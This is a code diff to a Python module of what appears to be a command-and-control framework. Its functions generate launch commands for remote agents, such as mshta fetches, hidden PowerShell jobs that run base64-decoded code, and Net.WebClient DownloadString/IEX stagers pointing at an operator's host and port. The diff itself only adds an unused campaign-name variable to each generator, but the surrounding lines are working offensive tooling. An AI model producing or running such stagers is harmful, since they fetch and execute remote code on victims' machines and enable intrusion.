@@ -4,6 +4,10 @@ import base64
 def generate_hta_agent_str(host, port, ssl, campaign_folder):
     agents_folder = os.path.join(campaign_folder, "agents")
     os.makedirs(agents_folder, exist_ok=True)
+    
+    # Extract campaign name from folder path
+    campaign_name = os.path.basename(campaign_folder).replace("_campaign", "")
+    
     if ssl:
         result = f"mshta https://{host}:{port}/hta_agent\npowershell -c \"mshta https://{host}:{port}/hta_agent\""
     else:
@@ -15,6 +19,10 @@ def generate_hta_agent_str(host, port, ssl, campaign_folder):
 def generate_pwsh_job_str(host, port, ssl, campaign_folder):
     agents_folder = os.path.join(campaign_folder, "agents")
     os.makedirs(agents_folder, exist_ok=True)
+    
+    # Extract campaign name from folder path
+    campaign_name = os.path.basename(campaign_folder).replace("_campaign", "")
+    
     commandJ = "Start-Job -scriptblock {iex([System.Text.Encoding]::ASCII.GetString([System.Convert]::FromBase64String('{agent}')))}"
     commandP = 'Start-Process powershell -ArgumentList "iex([System.Text.Encoding]::ASCII.GetString([System.Convert]::FromBase64String(\'{agent}\')))" -WindowStyle Hidden'
     raw_agent = "/raw_agent"
@@ -31,6 +39,10 @@ def generate_pwsh_job_str(host, port, ssl, campaign_folder):
 def generate_pwsh_file_str(host, port, ssl, campaign_folder):
     agents_folder = os.path.join(campaign_folder, "agents")
     os.makedirs(agents_folder, exist_ok=True)
+    
+    # Extract campaign name from folder path
+    campaign_name = os.path.basename(campaign_folder).replace("_campaign", "")
+    
     commandF = "iex([System.Text.Encoding]::ASCII.GetString([System.Convert]::FromBase64String('{agent}')))"
     hjf_agent = "/hjf_agent"
     http = "https" if ssl else "http"
@@ -44,6 +56,10 @@ def generate_pwsh_file_str(host, port, ssl, campaign_folder):
 def generate_pwsh_sct_str(host, port, ssl, campaign_folder):
     agents_folder = os.path.join(campaign_folder, "agents")
     os.makedirs(agents_folder, exist_ok=True)
+    
+    # Extract campaign name from folder path
+    campaign_name = os.path.basename(campaign_folder).replace("_campaign", "")
+    
     commandF = "iex([System.Text.Encoding]::ASCII.GetString([System.Convert]::FromBase64String('{agent}')))"
     hjfs_agent = "/hjfs_agent"
     http = "https" if ssl else "http"
@@ -57,6 +73,10 @@ def generate_pwsh_sct_str(host, port, ssl, campaign_folder):
 def generate_pwsh_misc_str(host, port, ssl, campaign_folder):
     agents_folder = os.path.join(campaign_folder, "agents")
     os.makedirs(agents_folder, exist_ok=True)
+    
+    # Extract campaign name from folder path
+    campaign_name = os.path.basename(campaign_folder).replace("_campaign", "")
+    
     http = "https" if ssl else "http"
     raw_agent = "/raw_agent"
     result = f"Simple Powershell Agent:\npowershell -w hidden \"Invoke-Expression((New-Object Net.WebClient).DownloadString('{http}://{host}:{port}{raw_agent}'))\""
@@ -67,6 +87,10 @@ def generate_pwsh_misc_str(host, port, ssl, campaign_folder):
 def generate_pwsh_base64_str(host, port, ssl, campaign_folder):
     agents_folder = os.path.join(campaign_folder, "agents")
     os.makedirs(agents_folder, exist_ok=True)
+    
+    # Extract campaign name from folder path
+    campaign_name = os.path.basename(campaign_folder).replace("_campaign", "")
+    
     http = "https" if ssl else "http"
     b64_stager = "/b64_stager"
     agent = f"$V=new-object net.webclient;$S=$V.DownloadString('{http}://{host}:{port}{b64_stager}');IEX($S)"
@@ -79,6 +103,10 @@ def generate_pwsh_base64_str(host, port, ssl, campaign_folder):
 def generate_pwsh_base52_str(host, port, ssl, campaign_folder):
     agents_folder = os.path.join(campaign_folder, "agents")
     os.makedirs(agents_folder, exist_ok=True)
+    
+    # Extract campaign name from folder path
+    campaign_name = os.path.basename(campaign_folder).replace("_campaign", "")
+    
     http = "https" if ssl else "http"
     b52_stager = "/b52_stager"
     b52_agent = "/b52_agent"
